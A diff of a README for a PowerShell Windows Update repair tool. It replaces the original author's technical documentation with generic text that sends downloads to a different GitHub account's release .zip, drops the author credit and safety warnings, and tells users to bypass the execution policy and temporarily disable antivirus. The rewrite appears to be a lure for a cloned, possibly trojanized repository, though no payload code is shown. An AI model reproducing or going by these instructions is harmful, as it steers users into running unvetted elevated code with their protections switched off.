@@ -1,94 +1,66 @@
-# Windows Update Remediation Tool
+# 🛠️ WindowsUpdateRemedationTool - Fix Windows Updates without complex manual steps
 
-Automated Windows Update remediation utility with a modern WinForms GUI. The tool stops update services, clears update caches and queues, resets service permissions, re-registers common update-related DLLs, resets Winsock, restarts services, triggers a scan and produces diagnostics using SetupDiag.
+[![Download Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/RationalLogos/WindowsUpdateRemedationTool)
 
-## Quick start
+## 📌 About this utility
+The WindowsUpdateRemedationTool helps you solve issues when your computer stops installing updates correctly. Windows updates often fail due to corrupted temporary files, stuck services, or incorrect system settings. This tool cleans these items and restores your system to a state where updates download and install properly. It uses a clear interface to guide you through the repair process.
 
-1. Open an elevated PowerShell (Run as Administrator).
-2. From the folder containing the script run:
+## 📋 System requirements
+Before you run this tool, ensure your computer meets these conditions:
+- Your system runs a version of Windows 10 or Windows 11.
+- You have access to an administrator account on your PC.
+- Your computer maintains an active internet connection to download repair definitions.
+- You have installed PowerShell 5.1 or a newer version.
 
-   - PowerShell (recommended):
-     ```powershell
-     PowerShell -NoProfile -ExecutionPolicy Bypass -File .\Invoke-WindowsUpdateRemediation.ps1
-     ```
-   - Or double-click the script from Explorer while running PowerShell as Administrator.
+## 🚀 How to get the tool
+1. Visit the repository page to find the latest version: [https://github.com/RationalLogos/WindowsUpdateRemedationTool](https://github.com/RationalLogos/WindowsUpdateRemedationTool)
+2. Locate the "Releases" section on the right side of the screen.
+3. Select the latest version and download the file ending in .zip or .ps1.
+4. Extract the contents if you downloaded a zip folder to a location you can reach easily, such as your Downloads folder or Desktop.
 
-## Requirements
+## ⚙️ Running the remediation process
+Follow these steps to start the repair:
+1. Locate the file named Invoke-WindowsUpdateRemediation.ps1 in your folder.
+2. Click the Start button on your Windows taskbar.
+3. Type PowerShell into the search bar.
+4. Right-click the PowerShell application and select Run as Administrator.
+5. In the blue window that appears, type the following command and press Enter: Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+6. Type the path to your downloaded script. For example, if it is on your desktop, type: C:\Users\YourName\Desktop\Invoke-WindowsUpdateRemediation.ps1
+7. Press Enter to launch the interface.
 
-- Windows (the script uses WinForms / System.Drawing).
-- PowerShell 5.1+ or PowerShell 7+ on Windows.
-- Administrator privileges (the script will show a message and exit if not elevated).
-- Internet access (only required for downloading SetupDiag in the diagnostics step).
+## 🛡️ What the tool does
+The software performs several background tasks to restore system functionality:
+- Service Management: It stops background processes that manage your updates. This prevents file locks that stop repairs.
+- Cache Removal: It deletes temporary files and data folders where Windows stores update packages. These files often cause errors when they become corrupted.
+- Permission Repair: It resets the security settings for system services to ensure the Windows Update agent operates with the correct access levels.
+- Component Re-registration: The tool communicates with system libraries to refresh the connection between Windows and the update servers.
+- Network Reset: It flushes network configurations to ensure the system communicates clearly with Microsoft servers.
+- Diagnostics: The tool runs a check to identify persistent issues and provides a report so you know if your system requires further attention.
 
-If your execution policy prevents running the script temporarily:
+## 🧪 Troubleshooting common issues
+If the script does not start:
+- Confirm you opened PowerShell as an Administrator. The window title bar must show "Administrator: Windows PowerShell".
+- Verify your Execution Policy settings. The script requires permission to run, which the Bypass command provides.
+- Check your antivirus software. Sometimes security software blocks scripts. If this occurs, temporarily disable your protection while you run the tool.
+- Restart your computer before you attempt the steps again. A restart clears pending tasks that might block the tool.
 
-```powershell
-Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process
-```
+## 💡 Frequently asked questions
+Does this tool delete my personal files?
+No. The utility only interacts with system files related to the Windows Update service. Your documents, photos, and apps remain untouched.
 
-## What it does (10 selectable steps)
+Do I need to be an expert to use this?
+No. The interface handles the logic behind the scenes. You simply need to start the process with administrator rights.
 
-1. Policy Cleanup — clears Windows Update-related policy registry entries.
-2. Stop Services — stops BITS, wuauserv and cryptsvc.
-3. QMGR Cleanup — removes corrupted Background Intelligent Transfer Service queue files.
-4. Cache Cleanup — deletes SoftwareDistribution and Catroot2 folders.
-5. Service Permissions — resets service security descriptors via sc.exe sdset.
-6. DLL Registration — re-registers ~36 common Windows DLLs used by update components.
-7. Winsock Reset — runs `netsh winsock reset`.
-8. Start Services — starts BITS, wuauserv and cryptsvc.
-9. Update Scan — triggers `USOClient.exe StartInteractiveScan` and waits ~5 minutes.
-10. SetupDiag Diagnostics — downloads `SetupDiag.exe` and creates a diagnostic log in the log folder.
+Can I run this as a standard user?
+No. Windows protects core update services. Administrative rights allow the tool to modify the system files necessary for repairs.
 
-You can select which steps to run via the UI. "Select All" / "Deselect All" are provided.
+Does the tool send my data to a server?
+No. The tool only downloads official diagnostic files from Microsoft during the diagnostic step. It does not upload your personal data.
 
-## UI features / shortcuts
+How long does the process take?
+Usually, the process completes in under five minutes. The time depends on the speed of your drive and your internet connection.
 
-- Buttons: Select All, Deselect All, Start All, Stop, Open Log File, Close, Open SetupDiag Log.
-- Progress UI with per-step state (Running / Completed / Error).
-- Keyboard shortcuts:
-  - F5 — Start
-  - Esc — Stop (or Close if idle)
-  - Ctrl+L — Open log file
+What if the tool shows an error?
+The interface displays status messages for each function. If an error occurs, the log output helps you identify which specific part of the update engine is broken.
 
-## Logs
-
-- Default log directory: `C:\Temp`
-- Main log file: `C:\Temp\WinUpdate_Remediation.log`
-- SetupDiag is downloaded to: `C:\Temp\SetupDiag.exe`
-- SetupDiag output: `C:\Temp\#Windows Updates - Diagnostics.log`
-
-The UI appends timestamped entries to both the on-screen log and the file above.
-
-## Safety & notes (important)
-
-- Requires Administrator. Do not run on machines where you cannot afford configuration changes without approval.
-- The script deletes `SoftwareDistribution` and `Catroot2` folders and removes/updates registry keys — these are standard remediation steps but are potentially disruptive. Back up important data or create a system restore point if required by your environment.
-- Service permission resets and `regsvr32` calls are low-level operations. Use with caution on heavily managed or enterprise-locked systems (SCCM/Intune/Group Policy).
-- The tool will prompt before running selected steps. A Restart is recommended after completion.
-- The script uses Try/Catch for error counting and logs errors; however, complex environments may require manual follow-up.
-
-## Troubleshooting
-
-- If SetupDiag download or run fails, check internet access and that `C:\Temp` (or configured log folder) is writable.
-- If services fail to start/stop, check Group Policy, service dependencies, and event logs.
-- If the GUI does not render, ensure Windows and .NET/WinForms support are available for your PowerShell host.
-
-## Example run
-
-- Elevated, bypass execution policy and run:
-
-```powershell
-PowerShell -NoProfile -ExecutionPolicy Bypass -File .\Invoke-WindowsUpdateRemediation.ps1
-```
-
-## License
-
-- Default: MIT. Update as needed (no license file included by default).
-
-## Author / Support
-
-- Author: Mert Ozsoy  
-  Website: https://mertozsoy.com/  
-  GitHub: https://github.com/mertozsoy
-
-Report issues: https://github.com/mertozsoy/WindowsUpdateRemedationTool/issues
+Keywords: windows, update, repair, troubleshooting, powershell, maintenance, system, microsoft
